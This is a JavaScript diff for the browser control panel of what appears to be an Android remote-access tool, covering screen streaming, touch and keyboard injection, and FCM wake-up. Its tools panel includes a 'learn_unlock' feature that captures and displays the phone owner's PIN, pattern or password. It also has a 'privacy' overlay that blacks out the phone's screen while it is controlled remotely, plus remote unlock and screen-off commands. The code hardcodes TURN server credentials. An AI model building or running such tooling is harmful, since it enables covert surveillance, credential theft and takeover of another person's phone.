+const ICE_SERVERS = [
+  { urls: 'stun:stun.l.google.com:19302' },
+  { urls: 'turn:global.relay.metered.ca:3478', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:3478?transport=tcp', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:80', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:443', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:443?transport=tcp', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' }
+];
+
+let audioCtx = null;
+function beep(freq = 880, dur = 0.05, vol = 0.04) {
+  try {
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+    o.type = 'square'; o.frequency.value = freq;
+    g.gain.setValueAtTime(vol, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + dur);
+    o.connect(g).connect(audioCtx.destination);
+    o.start(); o.stop(audioCtx.currentTime + dur);
+  } catch(_) {}
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  WEBSOCKET + WEBRTC
+// ═══════════════════════════════════════════════════════════════════════
+function connect() {
+  if (!DEVICE_ID) return;
+  ws = new WebSocket(SERVER_URL);
+  ws.binaryType = 'arraybuffer';
+
+  ws.onopen = () => {
+    document.getElementById('conn-status').textContent = 'Joining room…';
+    ws.send(JSON.stringify({ type: 'join', room: DEVICE_ID, role: 'controller' }));
+    ws.send(JSON.stringify({ type: 'stream-mode-choice', mode: chosenMode }));
+    if (chosenMode === 'webrtc') setupWebRTC();
+  };
+
+  ws.onmessage = async (ev) => {
+    if (ev.data instanceof ArrayBuffer) {
+      if (currentMode === 'screenshot' || currentMode === 'accessibility') {
+        ss.bytes += ev.data.byteLength;
+        ss.recv++;
+        handleFrame(new Uint8Array(ev.data));
+      }
+      return;
+    }
+    let data;
+    try { data = JSON.parse(ev.data); } catch(_) { return; }
+
+    if (data.type === 'host-ready') {
+      document.getElementById('conn-status').textContent = 'Host ready';
+      document.getElementById('conn-sub').textContent = 'Waiting for stream…';
+    }
+    else if (data.type === 'waiting-for-host') {
+      document.getElementById('conn-status').textContent = 'Waking host…';
+      document.getElementById('conn-sub').textContent = 'Sending FCM wake';
+    }
+    else if (data.type === 'streaming-started') {
+      document.getElementById('conn').classList.add('hidden');
+      isConnected = true;
+      beep(880, 0.06); setTimeout(() => beep(1320, 0.09), 70);
+      if (data.mode === 'webrtc') switchToWebRTC();
+      else if (data.mode === 'accessibility') switchToScreenshot('Accessibility');
+      else switchToScreenshot('Screenshot');
+      if (statsOn) startStats();
+    }
+    else if (data.type === 'dimensions') {
+      hostWidth = data.width;
+      hostHeight = data.height;
+      const c = document.getElementById('v-canvas');
+      c.width = hostWidth; c.height = hostHeight;
+      fit();
+    }
+    else if (data.type === 'mode') {
+      if (data.value === 'screenshot') switchToScreenshot('Screenshot');
+      else if (data.value === 'accessibility') switchToScreenshot('Accessibility');
+      else if (data.value === 'webrtc') switchToWebRTC();
+    }
+    else if (data.type === 'overlay_stopped') {
+      privacyActive = false;
+      document.getElementById('tb-privacy').classList.remove('privacy-on');
+    }
+    else if (data.type === 'unlock_result') {
+      document.getElementById('tools-result').textContent =
+        data.success ? '✅ Unlock succeeded' : '❌ ' + (data.reason || 'unlock failed');
+    }
+    else if (data.type === 'learn_result') {
+      const label = data.unlock_type === 'pin' ? 'PIN' : data.unlock_type === 'pattern' ? 'Pattern' : 'Password';
+      document.getElementById('tools-result').textContent = `Saved — ${label}: ${data.value}`;
+    }
+        else if (data.type === 'learn_status') {
+      const box = document.getElementById('tools-result')
+      if (data.status === 'started') {
+        box.textContent = 'Learning active — unlock phone now'
+      } else {
+        box.textContent = data.status
+      }
+    }
+    else if (data.type === 'offer') {
+      if (!pc) return;
+      await pc.setRemoteDescription({ type: 'offer', sdp: data.sdp });
+      const ans = await pc.createAnswer();
+      let sdp = ans.sdp;
+      sdp = sdp.replace(/b=AS:\d+\r\n/g,'').replace(/b=TIAS:\d+\r\n/g,'');
+      sdp = sdp.replace(/a=mid:video\r\n/g, 'a=mid:video\r\nb=AS:30000\r\nb=TIAS:30000000\r\n');
+      await pc.setLocalDescription({ type: 'answer', sdp });
+      ws.send(JSON.stringify({ type: 'answer', sdp }));
+    }
+    else if (data.type === 'ice') {
+      if (!pc) return;
+      try { await pc.addIceCandidate({ candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex }); } catch(_) {}
+    }
+    else if (data.type === 'pong') { ctrlRtt = Date.now() - data.t; }
+    else if (data.type === 'render_response') { handleRenderResponse(data); }
+    else if (data.type === 'auto_click_result') { handleAutoClickResult(data); }
+    else if (data.type === 'peer-left') { disconnect('Host disconnected'); }
+  };
+
+  ws.onclose = () => { if (isConnected) disconnect('Connection lost'); };
+}
+
+function setupWebRTC() {
+  pc = new RTCPeerConnection({ iceServers: ICE_SERVERS, sdpSemantics: 'unified-plan' });
+  pc.onicecandidate = e => {
+    if (e.candidate && ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type:'ice', candidate: e.candidate.candidate, sdpMid: e.candidate.sdpMid, sdpMLineIndex: e.candidate.sdpMLineIndex }));
+    }
+  };
+  pc.ontrack = e => {
+    const v = document.getElementById('v-video');
+    v.srcObject = e.streams[0];
+    try { e.receiver.jitterBufferTarget = 0; } catch(_) {}
+    try { e.receiver.playoutDelayHint = 0; } catch(_) {}
+  };
+}
+
+function sendMsg(o) {
+  if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(o));
+  // Auto-refresh hooks — schedule a snapshot after any actionable command
+  if (autoRefreshOn && snapshotMode) {
+    const actionable = ['touch', 'drag_end', 'keyboard', 'system', 'swipe', 'longpress', 'scroll'];
+    if (o && actionable.includes(o.type)) scheduleAutoRefresh();
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  MODE + FIT
+// ═══════════════════════════════════════════════════════════════════════
+function switchToWebRTC() {
+  currentMode = 'webrtc';
+  document.getElementById('v-canvas').style.display = 'none';
+  document.getElementById('v-video').style.display = 'block';
+  document.getElementById('hd-mode').textContent = 'WEBRTC';
+  fit();
+}
+function switchToScreenshot(label = 'Screenshot') {
+  currentMode = 'screenshot';
+  document.getElementById('v-video').style.display = 'none';
+  document.getElementById('v-canvas').style.display = 'block';
+  document.getElementById('hd-mode').textContent = label.toUpperCase();
+  fit();
+}
+
+function fit() {
+  const wrap = document.getElementById('stream-wrap');
+  const canvas = document.getElementById('v-canvas');
+  const video = document.getElementById('v-video');
+  const snapshot = document.getElementById('v-snapshot');
+  const cW = wrap.clientWidth, cH = wrap.clientHeight;
+  if (!cW || !cH) return;
+  const ratio = hostWidth / hostHeight;
+  const cR = cW / cH;
+  let w, h;
+  if (cR > ratio) { h = cH; w = h * ratio; } else { w = cW; h = w / ratio; }
+  const L = Math.round((cW - w) / 2), T = Math.round((cH - h) / 2);
+  const wire = document.getElementById('v-wire');
+  [canvas, video, snapshot, wire].forEach(el => {
+    el.style.width = Math.round(w) + 'px';
+    el.style.height = Math.round(h) + 'px';
+    el.style.left = L + 'px';
+    el.style.top = T + 'px';
+  });
+}
+window.addEventListener('resize', fit);
+window.addEventListener('orientationchange', () => setTimeout(fit, 200));
+
+// ═══════════════════════════════════════════════════════════════════════
+//  FRAME DECODER
+// ═══════════════════════════════════════════════════════════════════════
+async function handleFrame(data) {
+  const canvas = document.getElementById('v-canvas');
+  const ctx = canvas.getContext('2d');
+  const type = data[0];
+  if (type === 0) {
+    const blob = new Blob([data.slice(1)], { type: 'image/jpeg' });
+    const bmp = await createImageBitmap(blob);
+    ctx.drawImage(bmp, 0, 0, hostWidth, hostHeight);
+    bmp.close();
+    ss.full++;
+  } else if (type === 1) {
+    let off = 2;
+    const n = data[1];
+    const proms = [];
+    for (let i = 0; i < n; i++) {
+      const col = data[off++], row = data[off++];
+      const w = data[off++], h = data[off++];
+      const len = ((data[off]&0xFF)<<24)|((data[off+1]&0xFF)<<16)|((data[off+2]&0xFF)<<8)|(data[off+3]&0xFF);
+      off += 4;
+      const bytes = data.slice(off, off + len);
+      off += len;
+      const x = col * TILE_SIZE, y = row * TILE_SIZE;
+      const blob = new Blob([bytes], { type: 'image/jpeg' });
+      proms.push(createImageBitmap(blob).then(b => ({ b, x, y })));
+    }
+    const imgs = await Promise.all(proms);
+    imgs.forEach(({ b, x, y }) => { ctx.drawImage(b, x, y); b.close(); });
+    ss.tiles++;
+  }
+  ss.drawn++;
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  POINTER EVENTS — works for mouse + touch + pen (mobile-safe)
+// ═══════════════════════════════════════════════════════════════════════
+function getActiveEl() {
+  return currentMode === 'webrtc' ? document.getElementById('v-video') : document.getElementById('v-canvas');
+}
+function coordsFromEvent(e) {
+  const r = getActiveEl().getBoundingClientRect();
+  const x = (e.clientX - r.left) / r.width;
+  const y = (e.clientY - r.top) / r.height;
+  if (x < 0 || x > 1 || y < 0 || y > 1) return null;
+  return { x, y };
+}
+function clampedFromEvent(e) {
+  const r = getActiveEl().getBoundingClientRect();
+  return {
+    x: Math.min(1, Math.max(0, (e.clientX - r.left) / r.width)),
+    y: Math.min(1, Math.max(0, (e.clientY - r.top) / r.height)),
+  };
+}
+
+const wrap = document.getElementById('stream-wrap');
+
+wrap.addEventListener('pointerdown', (e) => {
+  if (e.button !== undefined && e.button !== 0 && e.pointerType === 'mouse') return;
+  e.preventDefault();
+  try { wrap.setPointerCapture(e.pointerId); } catch(_) {}
+
+  const c = coordsFromEvent(e);
+  if (!c) return;
+
+  pointerDown = true;
+  pointerStartX = e.clientX;
+  pointerStartY = e.clientY;
+  longPressTriggered = false;
+  dragActive = false;
+  lastMoveSent = 0;
+
+  longPressTimer = setTimeout(() => {
+    if (!pointerDown) return;
+    const cc = { x: c.x, y: c.y };
+    sendMsg({ type:'longpress', x: cc.x, y: cc.y });
+    longPressTriggered = true;
+  }, 500);
+});
+
+wrap.addEventListener('pointermove', (e) => {
+  if (!pointerDown) return;
+  e.preventDefault();
+
+  if (!dragActive) {
+    const dx = e.clientX - pointerStartX;
+    const dy = e.clientY - pointerStartY;
+    if (Math.hypot(dx, dy) <= DRAG_THRESHOLD) return;
+    clearTimeout(longPressTimer);
+    if (longPressTriggered) return;
+    dragActive = true;
+    const s = clampedFromEvent({ clientX: pointerStartX, clientY: pointerStartY });
+    sendMsg({ type:'drag_start', x: s.x, y: s.y, t: Date.now() });
+  }
+
+  const now = Date.now();
+  if (now - lastMoveSent < MOVE_INTERVAL_MS) return;
+  lastMoveSent = now;
+  const c = clampedFromEvent(e);
+  sendMsg({ type:'drag_move', x: c.x, y: c.y, t: now });
+});
+
+function endPointer(e) {
+  if (!pointerDown) return;
+  pointerDown = false;
+  clearTimeout(longPressTimer);
+
+  if (dragActive) {
+    dragActive = false;
+    const c = clampedFromEvent(e);
+    sendMsg({ type:'drag_end', x: c.x, y: c.y, t: Date.now() });
+    return;
+  }
+  if (longPressTriggered) { longPressTriggered = false; return; }
+
+  const c = coordsFromEvent(e);
+  if (!c) return;
+  sendMsg({ type:'touch', x: c.x, y: c.y, action: 'tap' });
+}
+wrap.addEventListener('pointerup', endPointer);
+wrap.addEventListener('pointercancel', endPointer);
+
+// Wheel (desktop)_
+wrap.addEventListener('wheel', e => {
+  e.preventDefault();
+  const c = coordsFromEvent(e);
+  if (!c) return;
+  const delta = e.deltaY !== 0 ? e.deltaY : e.deltaX;
+  sendMsg({ type:'scroll', x:c.x, y:c.y, deltaX:0, deltaY: Math.sign(delta) * 0.003 });
+}, { passive: false });
+
+// Prevent double-tap zoom / pinch zoom on the stream area
+wrap.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
+wrap.addEventListener('gesturestart', e => e.preventDefault());
+
+// Physical keyboard shortcuts
+document.addEventListener('keydown', e => {
+  if (e.target === document.getElementById('kb-input')) return;
+  if (e.target === document.getElementById('privacy-text-input')) return;
+  if (e.repeat) return;
+  if (e.key === 'Backspace') { e.preventDefault(); sendMsg({ type:'keyboard', text:'\b' }); }
+  else if (e.key === 'Enter') { sendMsg({ type:'keyboard', text:'\n' }); }
+  else if (e.key.length === 1) { sendMsg({ type:'keyboard', text: e.key }); }
+});
+
+// ═══════════════════════════════════════════════════════════════════════
+//  SIDE PANELS
+// ═══════════════════════════════════════════════════════════════════════
+function openPanel(id) {
+  document.getElementById('panel-backdrop').classList.add('show');
+  document.getElementById(id).classList.add('show');
+}
+function closeAllPanels() {
+  document.getElementById('panel-backdrop').classList.remove('show');
+  document.querySelectorAll('.side-panel').forEach(p => p.classList.remove('show'));
+}
+document.getElementById('panel-backdrop').addEventListener('click', closeAllPanels);
+
+// ═══════════════════════════════════════════════════════════════════════
+//  TOOLBAR BUTTONS
+// ═══════════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════
+//  SNAPSHOT MODE
+// ═══════════════════════════════════════════════════════════════════════
+function updateSnapButton() {
+  const btnSnap    = document.getElementById('tb-snap');
+  const btnRefresh = document.getElementById('tb-snap-refresh');
+  const btnLive    = document.getElementById('tb-live');
+  const btnAuto    = document.getElementById('tb-auto');
+  const btnHints   = document.getElementById('tb-hints');
+
+  if (snapshotPending) {
+    btnSnap.textContent = '⏳ WAIT';
+    btnRefresh.textContent = '⏳ WAIT';
+  } else {
+    btnSnap.textContent = '📷 RENDER';
+    btnRefresh.textContent = '🔄 REFRESH';
+  }
+
+  // Live mode → show RENDER only
+  // Frozen mode → show REFRESH + AUTO + LIVE
+  btnSnap.style.display    = snapshotMode ? 'none' : 'flex';
+  btnRefresh.classList.toggle('show', snapshotMode);
+  btnLive.classList.toggle('show', snapshotMode);
+  btnAuto.classList.toggle('show', snapshotMode);
+  btnHints.classList.toggle('show', snapshotMode);
+}
+
+function requestSnapshot() {
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
+  snapshotPending = true;
+  updateSnapButton();
+  ws.send(JSON.stringify({ type: 'render_request' }));
+  // Fallback timeout
+  setTimeout(() => {
+    if (snapshotPending) {
+      snapshotPending = false;
+      updateSnapButton();
+      console.warn('snapshot timeout');
+    }
+  }, 8000);
+}
+
+let snapshotData = null;      // { tree: [...], pkg, w, h }
+
+function handleRenderResponse(data) {
+  snapshotPending = false;
+  updateSnapButton();
+  if (data.error) {
+    console.warn('render error:', data.error);
+    return;
+  }
+  snapshotAt = Date.now();
+  snapshotData = {
+    tree: data.tree || [],
+    pkg: data.pkg || '',
+    w: data.w || hostWidth * 2,
+    h: data.h || hostHeight * 2,
+  };
+  renderSnapshotView();
+  enterSnapshot();
+  updateSnapshotBadge();
+  if (snapshotTimer) clearInterval(snapshotTimer);
+  snapshotTimer = setInterval(updateSnapshotBadge, 500);
+}
+
+function renderSnapshotView() {
+  if (!snapshotData) return;
+  const img = document.getElementById('v-snapshot');
+  const wire = document.getElementById('v-wire');
+  // Always wireframe — no toggle
+  img.classList.remove('show');
+  wire.classList.add('show');
+  drawWireframe();
+  fit();
+}
+
+function drawWireframe() {
+  if (!snapshotData) return;
+  const canvas = document.getElementById('v-wire');
+  const W = snapshotData.w;
+  const H = snapshotData.h;
+  canvas.width = W;
+  canvas.height = H;
+
+  const ctx = canvas.getContext('2d');
+  ctx.fillStyle = '#000';
+  ctx.fillRect(0, 0, W, H);
+
+  // Package name header
+  ctx.font = 'bold 32px "JetBrains Mono", monospace';
+  ctx.fillStyle = '#4a90ff';
+  ctx.fillText(snapshotData.pkg || '(unknown)', 30, 48);
+
+  for (const n of snapshotData.tree) {
+    const l = n.l, t = n.tp, r = n.r, b = n.b;
+    const w = r - l, h = b - t;
+    if (w < 4 || h < 4) continue;
+
+    const clickable  = n.clk === true;
+    const editable   = n.edt === true;
+    const scrollable = n.scr === true;
+    const focused    = n.foc === true;
+    const selected   = n.sel === true;
+    const isContainer = n.cnt === true;
+    const text       = n.t || '';
+    const cls        = n.c || '';
+
+    // ── Draw outline (priority order: focused > editable > clickable > scrollable > container) ──
+    if (focused) {
+      ctx.strokeStyle = 'rgba(255,60,60,0.95)';
+      ctx.lineWidth = 4;
+      ctx.strokeRect(l, t, w, h);
+    } else if (editable) {
+      ctx.strokeStyle = 'rgba(74,144,255,0.85)';
+      ctx.lineWidth = 3;
+      ctx.strokeRect(l, t, w, h);
+    } else if (clickable) {
+      ctx.strokeStyle = 'rgba(61,220,132,0.7)';
+      ctx.lineWidth = 2;
+      ctx.strokeRect(l, t, w, h);
+    } else if (scrollable) {
+      ctx.strokeStyle = 'rgba(255,180,0,0.55)';
+      ctx.lineWidth = 2;
+      ctx.setLineDash([8, 8]);
+      ctx.strokeRect(l, t, w, h);
+      ctx.setLineDash([]);
+    } else if (isContainer) {
+      // Dim outline for empty container nodes
+      ctx.strokeStyle = 'rgba(120,120,120,0.22)';
+      ctx.lineWidth = 1;
+      ctx.strokeRect(l, t, w, h);
+    } else {
+      // Non-interactive content node — very light outline
+      ctx.strokeStyle = 'rgba(120,120,120,0.12)';
+      ctx.lineWidth = 1;
+      ctx.strokeRect(l, t, w, h);
+    }
+
+    // ── Draw text ──
+    if (text) {
+      const fontSize = Math.max(14, Math.min(44, h * 0.55));
+      ctx.font = `400 ${fontSize}px "JetBrains Mono", monospace`;
+      ctx.fillStyle = selected ? '#4a90ff' : '#ffffff';
+
+      let display = text;
+      const maxWidth = w - 20;
+      while (display.length > 3 && ctx.measureText(display).width > maxWidth) {
+        display = display.slice(0, -4) + '…';
+      }
+      const baselineY = t + Math.min(fontSize + 6, h - 4);
+      ctx.fillText(display, l + 10, baselineY);
+    }
+
+    // ── Draw class name badge (top-right corner) ──
+    if (cls && w > 80 && h > 24 && !isContainer) {
+      ctx.font = '500 13px "JetBrains Mono", monospace';
+      ctx.fillStyle = 'rgba(120,220,255,0.65)';
+      const label = cls.length > 16 ? cls.slice(0, 15) + '…' : cls;
+      const textW = ctx.measureText(label).width;
+      if (textW < w - 20) {
+        ctx.fillText(label, r - textW - 8, t + 16);
+      }
+    }
+
+    // ── Container class name (faint, in corner) ──
+    if (cls && isContainer && w > 100 && h > 30) {
+      ctx.font = '500 11px "JetBrains Mono", monospace';
+      ctx.fillStyle = 'rgba(120,120,120,0.35)';
+      const label = cls.length > 18 ? cls.slice(0, 17) + '…' : cls;
+      ctx.fillText(label, l + 6, t + 14);
+    }
+  }
+
+  // Footer
+  ctx.font = '400 16px "JetBrains Mono", monospace';
+  ctx.fillStyle = 'rgba(160,160,160,0.8)';
+  ctx.fillText(`wireframe · ${snapshotData.tree.length} nodes`, 30, H - 20);
+}
+
+
+function updateSnapshotBadge() {
+  const badge = document.getElementById('snapshot-badge');
+  if (!snapshotMode || !snapshotAt) {
+    badge.classList.remove('show');
+    return;
+  }
+  const ago = Math.round((Date.now() - snapshotAt) / 1000);
+  badge.textContent = `RENDER · ${ago}s ago`;
+  badge.classList.add('show');
+}
+
+function enterSnapshot() {
+  if (snapshotMode) return;
+  snapshotMode = true;
+  const active = currentMode === 'webrtc'
+    ? document.getElementById('v-video')
+    : document.getElementById('v-canvas');
+  active.style.visibility = 'hidden';
+  document.getElementById('stream-wrap').classList.add('frozen');
+  updateSnapButton();
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  WIREFRAME HOVER TOOLTIP
+// ═══════════════════════════════════════════════════════════════════════
+let hoveredNode = null;
+let hintsEnabled = false;   // default OFF — better for touch devices
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function hideTooltip() {
+  const tt = document.getElementById('wire-tooltip');
+  if (tt) tt.classList.remove('show');
+  hoveredNode = null;
+}
+
+function updateTooltipContent(node) {
+  const tt = document.getElementById('wire-tooltip');
+  if (!tt) return;
+  const text = (node.t || '').slice(0, 400);
+  const cls = node.c || '';
+  const flags = [];
+  if (node.clk) flags.push('<span class="tt-flag">CLICK</span>');
+  if (node.edt) flags.push('<span class="tt-flag blue">EDIT</span>');
+  if (node.scr) flags.push('<span class="tt-flag yellow">SCROLL</span>');
+  if (node.foc) flags.push('<span class="tt-flag red">FOCUSED</span>');
+  if (node.sel) flags.push('<span class="tt-flag red">SELECTED</span>');
+  if (node.cnt) flags.push('<span class="tt-flag">CONTAINER</span>');
+
+  let html = '';
+  if (text) html += `<div class="tt-text">${escapeHtml(text)}</div>`;
+  if (cls)  html += `<div class="tt-meta">${escapeHtml(cls)}</div>`;
+  if (flags.length) html += `<div class="tt-flags">${flags.join('')}</div>`;
+  tt.innerHTML = html;
+}
+
+// Hover detection — mousemove only (desktop). Touch devices skip this.
+const wrapEl = document.getElementById('stream-wrap');
+wrapEl.addEventListener('mousemove', (e) => {
+  if (!hintsEnabled) { hideTooltip(); return; }        // 👈 gate
+  if (!snapshotMode || !snapshotData) { hideTooltip(); return; }
+  const wireCanvas = document.getElementById('v-wire');
+  if (!wireCanvas || !wireCanvas.classList.contains('show')) { hideTooltip(); return; }
+
+  const r = wireCanvas.getBoundingClientRect();
+  if (r.width < 1 || r.height < 1) { hideTooltip(); return; }
+
+  // Cursor position in device-pixel coordinates
+  const x = (e.clientX - r.left) / r.width * wireCanvas.width;
+  const y = (e.clientY - r.top) / r.height * wireCanvas.height;
+
+  // Hit-test: pick the SMALLEST node containing the point
+  // (smallest = most specific — avoids container swallowing the child)
+  let best = null;
+  let bestArea = Infinity;
+  const tree = snapshotData.tree || [];
+  for (let i = 0; i < tree.length; i++) {
+    const n = tree[i];
+    if (x < n.l || x > n.r || y < n.tp || y > n.b) continue;
+    const area = (n.r - n.l) * (n.b - n.tp);
+    if (area < bestArea) { bestArea = area; best = n; }
+  }
+
+  // Only show tooltip if the node has something to say
+  const hasInfo = best && (best.t || best.c || best.clk || best.edt || best.scr || best.foc || best.sel || best.cnt);
+  if (!hasInfo) { hideTooltip(); return; }
+
+  if (hoveredNode !== best) {
+    hoveredNode = best;
+    updateTooltipContent(best);
+  }
+
+  // Position tooltip near cursor with edge clamping
+  const tt = document.getElementById('wire-tooltip');
+  const cW = wrapEl.clientWidth;
+  const cH = wrapEl.clientHeight;
+  const px = e.clientX - wrapEl.getBoundingClientRect().left;
+  const py = e.clientY - wrapEl.getBoundingClientRect().top;
+  const ttW = Math.min(340, tt.offsetWidth || 200);
+  const ttH = tt.offsetHeight || 60;
+
+  let ttX = px + 16;
+  let ttY = py + 16;
+  if (ttX + ttW > cW - 8) ttX = px - ttW - 16;
+  if (ttY + ttH > cH - 8) ttY = cH - ttH - 8;
+  if (ttX < 4) ttX = 4;
+  if (ttY < 4) ttY = 4;
+
+  tt.style.left = ttX + 'px';
+  tt.style.top = ttY + 'px';
+  tt.classList.add('show');
+});
+
+wrapEl.addEventListener('mouseleave', hideTooltip);
+
+function exitSnapshot() {
+  if (!snapshotMode) return;
+  snapshotMode = false;
+  const active = currentMode === 'webrtc'
+    ? document.getElementById('v-video')
+    : document.getElementById('v-canvas');
+  active.style.visibility = '';
+  document.getElementById('v-snapshot').classList.remove('show');
+  document.getElementById('v-wire').classList.remove('show');
+  document.getElementById('snapshot-badge').classList.remove('show');
+  document.getElementById('stream-wrap').classList.remove('frozen');
+  updateSnapButton();
+  fit();
+  if (snapshotTimer) { clearInterval(snapshotTimer); snapshotTimer = null; }
+  if (autoRefreshTimer) { clearTimeout(autoRefreshTimer); autoRefreshTimer = null; }
+  snapshotData = null;
+  hideTooltip();
+}
+
+document.getElementById('tb-snap').addEventListener('click', () => {
+  if (!isConnected) return;
+  requestSnapshot();
+});
+
+document.getElementById('tb-snap-refresh').addEventListener('click', () => {
+  if (!isConnected) return;
+  requestSnapshot();
+});
+
+document.getElementById('tb-live').addEventListener('click', exitSnapshot);
+
+document.getElementById('tb-auto').addEventListener('click', () => {
+  autoRefreshOn = !autoRefreshOn;
+  const btn = document.getElementById('tb-auto');
+  btn.classList.toggle('on', autoRefreshOn);
+  btn.textContent = autoRefreshOn ? '⚡ AUTO ON' : '⚡ AUTO';
+});
+
+document.getElementById('tb-hints').addEventListener('click', () => {
+  hintsEnabled = !hintsEnabled;
+  const btn = document.getElementById('tb-hints');
+  btn.classList.toggle('on', hintsEnabled);
+  btn.textContent = hintsEnabled ? '💬 HINTS ON' : '💬 HINTS';
+  if (!hintsEnabled) hideTooltip();
+});
+
+// Auto-refresh scheduler — called after every user action
+function scheduleAutoRefresh() {
+  if (!autoRefreshOn || !snapshotMode) return;
+  if (autoRefreshTimer) clearTimeout(autoRefreshTimer);
+  autoRefreshTimer = setTimeout(() => {
+    autoRefreshTimer = null;
+    if (autoRefreshOn && snapshotMode && !snapshotPending) {
+      requestSnapshot();
+    }
+  }, 450);
+}
+
+document.getElementById('tb-back').addEventListener('click', () => sendMsg({ type:'system', action:'back' }));
+document.getElementById('tb-home').addEventListener('click', () => sendMsg({ type:'system', action:'home' }));
+document.getElementById('tb-recents').addEventListener('click', () => sendMsg({ type:'system', action:'recents' }));
+
+document.getElementById('tb-son').addEventListener('click', () => {
+  sendMsg({ type:'screen_on' });
+  const b = document.getElementById('tb-son');
+  const o = b.textContent;
+  b.textContent = '✓';
+  setTimeout(() => b.textContent = o, 1200);
+});
+document.getElementById('tb-soff').addEventListener('click', () => {
+  sendMsg({ type:'screen_off' });
+  const b = document.getElementById('tb-soff');
+  const o = b.textContent;
+  b.textContent = '✓';
+  setTimeout(() => b.textContent = o, 1200);
+});
+
+let lastPrivacyText = '';
+
+function updatePrivacyCharCount() {
+  const v = document.getElementById('privacy-text-input').value || '';
+  const el = document.getElementById('privacy-char-count');
+  el.textContent = `${v.length} / 30`;
+  el.classList.toggle('warn', v.length >= 25);
+}
+
+function activatePrivacy(textOverride) {
+  const raw = (textOverride !== undefined)
+    ? textOverride
+    : (document.getElementById('privacy-text-input').value || '');
+  const text = raw.slice(0, 30).trim();
+  if (textOverride === undefined) lastPrivacyText = text;
+  sendMsg({ type: 'overlay_start', text });
+  privacyActive = true;
+  document.getElementById('tb-privacy').classList.add('privacy-on');
+  applyPrivacyAmplify(true);
+  closeAllPanels();
+}
+
+document.getElementById('tb-privacy').addEventListener('click', () => {
+  const input = document.getElementById('privacy-text-input');
+  input.value = lastPrivacyText;
+  updatePrivacyCharCount();
+  openPanel('panel-privacy');
+  setTimeout(() => input.focus(), 250);
+});
+
+document.getElementById('privacy-cancel').addEventListener('click', closeAllPanels);
+document.getElementById('privacy-activate').addEventListener('click', () => activatePrivacy());
+document.getElementById('privacy-black').addEventListener('click', () => activatePrivacy(''));
+
+document.getElementById('privacy-deactivate').addEventListener('click', () => {
+  sendMsg({ type: 'overlay_stop' });
+  privacyActive = false;
+  document.getElementById('tb-privacy').classList.remove('privacy-on');
+  applyPrivacyAmplify(false);
+  closeAllPanels();
+});
+
+document.getElementById('privacy-text-input').addEventListener('input', updatePrivacyCharCount);
+document.getElementById('privacy-text-input').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') document.getElementById('privacy-activate').click();
+});
+
+// Keyboard panel
+document.getElementById('tb-type').addEventListener('click', () => {
+  openPanel('panel-kb');
+  setTimeout(() => document.getElementById('kb-input').focus(), 300);
+});
+document.getElementById('kb-cancel').addEventListener('click', closeAllPanels);
+document.getElementById('kb-send').addEventListener('click', () => {
+  const v = document.getElementById('kb-input').value;
+  if (v) sendMsg({ type:'keyboard', text: v });
+  document.getElementById('kb-input').value = '';
+  closeAllPanels();
+});
+document.getElementById('kb-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('kb-send').click();
+});
+
+// Tools panel
+document.getElementById('tb-tools').addEventListener('click', () => openPanel('panel-tools'));
+document.getElementById('tools-close').addEventListener('click', closeAllPanels);
+document.getElementById('tool-unlock').addEventListener('click', () => { sendMsg({ type:'unlock' }); document.getElementById('tools-result').textContent = 'Unlock sent…'; });
+document.getElementById('tool-verify').addEventListener('click', () => { sendMsg({ type:'verify' }); document.getElementById('tools-result').textContent = 'Verify sent…'; });
+document.getElementById('tool-learn').addEventListener('click', () => { sendMsg({ type:'learn_unlock' }); document.getElementById('tools-result').textContent = 'Learning started…'; });
+document.getElementById('tool-stoplearn').addEventListener('click', () => { sendMsg({ type:'stop_learn' }); document.getElementById('tools-result').textContent = 'Stopping…'; });
+
+// Stats
+document.getElementById('hd-stats').addEventListener('click', () => {
+  statsOn = !statsOn;
+  document.getElementById('hd-stats').classList.toggle('active', statsOn);
+  document.getElementById('stats').classList.toggle('show', statsOn);
+  if (statsOn) startStats(); else stopStats();
+});
+
+function startStats() {
+  if (statsTimer) return;
+  statsTimer = setInterval(async () => {
+    sendMsg({ type:'ping', t: Date.now() });
+    const now = performance.now();
+    let text = `mode:    ${currentMode}\n`;
+    if (currentMode === 'screenshot' || currentMode === 'accessibility') {
+      const cur = { t: now, bytes: ss.bytes, drawn: ss.drawn, recv: ss.recv };
+      if (ssPrev) {
+        const dt = (now - ssPrev.t) / 1000;
+        const fps = dt > 0 ? (cur.drawn - ssPrev.drawn) / dt : 0;
+        const recvFps = dt > 0 ? (cur.recv - ssPrev.recv) / dt : 0;
+        const kbps = dt > 0 ? Math.round((cur.bytes - ssPrev.bytes) * 8 / dt / 1000) : 0;
+        text += `video:   ${hostWidth}x${hostHeight} @${fps.toFixed(0)} fps (recv ${recvFps.toFixed(0)})\n`;
+        text += `bitrate: ${kbps} kbps\n`;
+      } else {
+        text += `waiting for frames…\n`;
